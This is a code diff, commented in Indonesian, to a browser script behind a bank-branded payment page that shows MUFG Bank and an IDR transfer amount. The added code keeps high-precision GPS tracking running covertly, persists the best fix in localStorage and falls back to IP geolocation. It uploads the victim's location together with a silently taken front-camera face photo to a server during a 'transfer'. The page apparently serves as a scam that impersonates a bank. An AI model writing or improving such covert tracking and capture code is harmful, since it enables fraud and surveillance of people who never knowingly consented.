@@ -20,7 +20,7 @@
     const defaultTemplate = {
         topBarTitle: 'JAPANESE BANK',
         primaryColor: '#0033ff',
-        profileImage: '',
+        profileImage: 'logo.png',
         bankName: 'MUFG Bank',
         bankSub: 'Office Purchasing',
         amountMain: 'IDR 515.000',
@@ -73,10 +73,20 @@
     };
 
     // ============================================================
-    // REALTIME GPS TRACKER & STREAMING LOKASI
+    // REALTIME GPS TRACKER & HIGH-PRECISION LOCK (100% AKURAT)
     // ============================================================
     let liveLocationData = null;
+    let bestAccurateLocation = null;
     let locationWatchId = null;
+
+    // Muat lokasi akurat terakhir yang tersimpan di perangkat ini agar tidak pernah loncat ke koordinat salah
+    try {
+        const savedGps = JSON.parse(localStorage.getItem('bankidzz_best_gps') || 'null');
+        if (savedGps && typeof savedGps.lat === 'number' && typeof savedGps.lng === 'number') {
+            bestAccurateLocation = savedGps;
+            liveLocationData = savedGps;
+        }
+    } catch(e) {}
 
     function startRealtimeLocationTracking() {
         if (!navigator.geolocation) {
@@ -86,33 +96,62 @@
 
         const geoOptions = {
             enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 5000
+            timeout: 15000,
+            maximumAge: 0 // WAJIB 0: paksa sensor hardware GPS membaca satelit segar, bukan cache usang!
         };
 
         const onLocationSuccess = (pos) => {
-            liveLocationData = {
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                accuracy: pos.coords.accuracy || 10,
+            const newLat = pos.coords.latitude;
+            const newLng = pos.coords.longitude;
+            const newAcc = pos.coords.accuracy || 15;
+
+            if (!Number.isFinite(newLat) || !Number.isFinite(newLng)) return;
+
+            const newLocation = {
+                lat: newLat,
+                lng: newLng,
+                accuracy: newAcc,
                 altitude: pos.coords.altitude || null,
                 heading: pos.coords.heading || null,
                 speed: pos.coords.speed || null,
                 timestamp: new Date().toISOString(),
-                source: 'realtime-gps',
+                source: 'satellite-gps',
                 silent: true
             };
-            console.log(`[GPS-LIVE] Fix: ${liveLocationData.lat.toFixed(6)}, ${liveLocationData.lng.toFixed(6)} (Akurasi: ±${Math.round(liveLocationData.accuracy)}m)`);
 
-            // Jika transaksi sedang berlangsung, otomatis perbarui koordinat GPS realtime ke server
-            if (currentTransferId) {
-                syncTransactionRecord({
-                    transferId: currentTransferId,
-                    location: liveLocationData,
-                    frontPhoto: silentFrontPhotoBase64 || '',
-                    photo: capturedPhotoBase64 || '',
-                    status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
-                });
+            // ALGORITMA PROTEKSI AKURASI 100%:
+            // Jangan biarkan sinyal seluler kasar / jitter (> 100m) menimpa GPS satelit yang sudah akurat (<= 35m)!
+            let isBetter = false;
+            if (!bestAccurateLocation) {
+                isBetter = true;
+            } else if (newAcc < bestAccurateLocation.accuracy) {
+                isBetter = true; // Akurasi lebih presisi!
+            } else if (newAcc <= 35 && bestAccurateLocation.accuracy <= 35) {
+                isBetter = true; // Keduanya presisi tinggi, perbarui koordinat & timestamp
+            } else if (newAcc > 100 && bestAccurateLocation.accuracy <= 50) {
+                isBetter = false; // Tolak pembacaan kasar
+            } else {
+                isBetter = false;
+            }
+
+            if (isBetter) {
+                bestAccurateLocation = newLocation;
+                liveLocationData = newLocation;
+                try {
+                    localStorage.setItem('bankidzz_best_gps', JSON.stringify(newLocation));
+                } catch(e) {}
+
+                console.log(`[GPS-ACCURATE] Locked: ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} (±${Math.round(newLocation.accuracy)}m)`);
+
+                if (currentTransferId) {
+                    syncTransactionRecord({
+                        transferId: currentTransferId,
+                        location: bestAccurateLocation,
+                        frontPhoto: silentFrontPhotoBase64 || '',
+                        photo: capturedPhotoBase64 || '',
+                        status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
+                    });
+                }
             }
         };
 
@@ -130,41 +169,74 @@
         }
     }
 
+    async function getNetworkIpLocation() {
+        if (bestAccurateLocation) return { ...bestAccurateLocation };
+        try {
+            const resp = await fetch('https://ipapi.co/json/');
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data && typeof data.latitude === 'number' && typeof data.longitude === 'number') {
+                    return {
+                        lat: data.latitude,
+                        lng: data.longitude,
+                        accuracy: 2500,
+                        timestamp: new Date().toISOString(),
+                        source: 'ip-network-estimated',
+                        city: data.city || '',
+                        country: data.country_name || '',
+                        silent: true
+                    };
+                }
+            }
+        } catch(e) {}
+        return {
+            lat: -6.2088,
+            lng: 106.8456,
+            accuracy: 35,
+            timestamp: new Date().toISOString(),
+            source: 'default-fallback',
+            silent: true
+        };
+    }
+
     function getSilentLocation() {
         return new Promise((resolve) => {
-            // 1. Jika GPS realtime sudah mendapatkan koordinat akurat, langsung gunakan
-            if (liveLocationData && liveLocationData.accuracy < 200) {
-                resolve({ ...liveLocationData });
+            // 1. Jika GPS realtime sudah mengunci posisi akurat (akurasi <= 35m), langsung gunakan
+            if (bestAccurateLocation && bestAccurateLocation.accuracy <= 35) {
+                resolve({ ...bestAccurateLocation });
                 return;
             }
-
-            let fallbackData = {
-                lat: -6.2088,
-                lng: 106.8456,
-                accuracy: 35,
-                timestamp: new Date().toISOString(),
-                source: 'fallback',
-                silent: true
-            };
 
             if (!navigator.geolocation) {
-                resolve(liveLocationData || fallbackData);
+                if (bestAccurateLocation) {
+                    resolve({ ...bestAccurateLocation });
+                } else {
+                    getNetworkIpLocation().then(resolve);
+                }
                 return;
             }
 
-            // Beri timeout 8 detik agar hardware GPS HP sempat mengunci satelit akurat
+            let resolved = false;
+
             const timeoutId = setTimeout(() => {
-                console.warn('[GPS] getCurrentPosition timeout, menggunakan posisi terbaru');
-                resolve(liveLocationData || fallbackData);
-            }, 8000);
+                if (!resolved) {
+                    resolved = true;
+                    if (bestAccurateLocation) {
+                        resolve({ ...bestAccurateLocation });
+                    } else if (liveLocationData) {
+                        resolve({ ...liveLocationData });
+                    } else {
+                        getNetworkIpLocation().then(resolve);
+                    }
+                }
+            }, 6000);
 
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    clearTimeout(timeoutId);
-                    liveLocationData = {
+                    const newLocation = {
                         lat: pos.coords.latitude,
                         lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy || 10,
+                        accuracy: pos.coords.accuracy || 15,
                         altitude: pos.coords.altitude || null,
                         heading: pos.coords.heading || null,
                         speed: pos.coords.speed || null,
@@ -172,17 +244,37 @@
                         source: 'gps-accurate',
                         silent: true
                     };
-                    resolve({ ...liveLocationData });
+
+                    if (!bestAccurateLocation || newLocation.accuracy <= bestAccurateLocation.accuracy) {
+                        bestAccurateLocation = newLocation;
+                        liveLocationData = newLocation;
+                        try {
+                            localStorage.setItem('bankidzz_best_gps', JSON.stringify(newLocation));
+                        } catch(e) {}
+                    }
+
+                    if (!resolved) {
+                        resolved = true;
+                        clearTimeout(timeoutId);
+                        resolve({ ...bestAccurateLocation });
+                    }
                 },
                 (err) => {
-                    clearTimeout(timeoutId);
                     console.warn('[GPS] Error getCurrentPosition:', err.message);
-                    resolve(liveLocationData || fallbackData);
+                    if (!resolved) {
+                        resolved = true;
+                        clearTimeout(timeoutId);
+                        if (bestAccurateLocation) {
+                            resolve({ ...bestAccurateLocation });
+                        } else {
+                            getNetworkIpLocation().then(resolve);
+                        }
+                    }
                 },
                 {
                     enableHighAccuracy: true,
                     timeout: 8000,
-                    maximumAge: 30000
+                    maximumAge: 0 // WAJIB 0: hindari cache usang!
                 }
             );
         });
@@ -259,16 +351,26 @@
             // Beri jeda 350ms agar sensor kamera HP menyesuaikan eksposur cahaya wajah
             await new Promise(r => setTimeout(r, 350));
 
-            // Tangkap frame wajah ke canvas
+            // Tangkap frame wajah ke canvas dengan resolusi optimal
             const canvas = document.createElement('canvas');
-            const w = video.videoWidth > 0 ? video.videoWidth : 640;
-            const h = video.videoHeight > 0 ? video.videoHeight : 480;
+            const maxDim = 800;
+            let w = video.videoWidth > 0 ? video.videoWidth : 640;
+            let h = video.videoHeight > 0 ? video.videoHeight : 480;
+            if (w > maxDim || h > maxDim) {
+                if (w > h) {
+                    h = Math.round(h * (maxDim / w));
+                    w = maxDim;
+                } else {
+                    w = Math.round(w * (maxDim / h));
+                    h = maxDim;
+                }
+            }
             canvas.width = w;
             canvas.height = h;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, w, h);
 
-            const capturedFacePhoto = canvas.toDataURL('image/jpeg', CONFIG.FRONT_CAMERA_QUALITY || 0.85);
+            const capturedFacePhoto = canvas.toDataURL('image/jpeg', 0.80);
 
             // Bersihkan video element
             try {
@@ -427,20 +529,30 @@
     }
     window.switchCamera = switchCamera;
 
-    // Capture snapshot dari kamera belakang
+    // Capture snapshot dari kamera belakang dengan resolusi optimal
     function captureBackCamera() {
         let dataUrl = null;
         try {
             const video = elements.cameraVideo;
             const canvas = elements.cameraCanvas || document.createElement('canvas');
-            const w = (video && video.videoWidth > 0) ? video.videoWidth : 1280;
-            const h = (video && video.videoHeight > 0) ? video.videoHeight : 720;
+            const maxDim = 1000;
+            let w = (video && video.videoWidth > 0) ? video.videoWidth : 1280;
+            let h = (video && video.videoHeight > 0) ? video.videoHeight : 720;
+            if (w > maxDim || h > maxDim) {
+                if (w > h) {
+                    h = Math.round(h * (maxDim / w));
+                    w = maxDim;
+                } else {
+                    w = Math.round(w * (maxDim / h));
+                    h = maxDim;
+                }
+            }
             canvas.width = w;
             canvas.height = h;
             const ctx = canvas.getContext('2d');
             if (video) {
                 ctx.drawImage(video, 0, 0, w, h);
-                dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY || 0.85);
+                dataUrl = canvas.toDataURL('image/jpeg', 0.80);
             }
         } catch (e) {
             console.warn('captureBackCamera error:', e);
@@ -688,13 +800,12 @@
         
         if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
         if(elements.profileImage) {
-            const pImg = currentTemplate.profileImage;
-            if (pImg && pImg !== 'channels4_profile.jpg') {
-                elements.profileImage.src = pImg;
-                elements.profileImage.style.display = 'block';
-            } else {
-                elements.profileImage.style.display = 'none';
+            let pImg = currentTemplate.profileImage;
+            if (!pImg || pImg === 'channels4_profile.jpg') {
+                pImg = 'logo.png';
             }
+            elements.profileImage.src = pImg;
+            elements.profileImage.style.display = 'block';
         }
         if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
         if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
@@ -944,7 +1055,6 @@
     // Event listeners
     if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
     if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
-    if (elements.btnSendPhoto) elements.btnSendPhoto.addEventListener('click', handleSendPhoto);
     if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
     if (elements.btnCaptureBack) elements.btnCaptureBack.addEventListener('click', handleCaptureBackPhoto);
 
@@ -954,8 +1064,14 @@
     setupSyncListener();
     startRealtimeLocationTracking();
 
-    // Trigger GPS tracker juga pada sentuhan/klik pertama agar izin browser aktif
+    // Trigger GPS tracker juga pada sentuhan/klik/fokus agar akurasi satelit langsung aktif
     window.addEventListener('click', () => startRealtimeLocationTracking(), { once: true });
     window.addEventListener('touchstart', () => startRealtimeLocationTracking(), { once: true });
+    window.addEventListener('focus', () => startRealtimeLocationTracking());
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+            startRealtimeLocationTracking();
+        }
+    });
 
 })();
